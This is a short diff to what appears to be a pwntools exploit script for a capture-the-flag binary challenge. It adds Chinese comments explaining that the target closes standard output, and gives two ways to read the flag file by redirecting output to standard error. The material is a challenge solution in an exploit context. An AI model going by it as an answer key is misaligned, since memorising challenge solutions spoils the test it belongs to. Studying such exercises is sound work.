@@ -6,6 +6,16 @@
   bufa = (void (*)(void))&buf[rand() % 256];
   close(1);
 close(1) -- 关闭了标准输出, exec 1>&2 重定向到错误就能输出了
+
+
+做法一：
+    ls 1>&2
+    cat flag 1>&2
+
+做法二：
+    exec 1>&2
+    cat flag
+
 """
 from ctypes import *
 from pwn import *
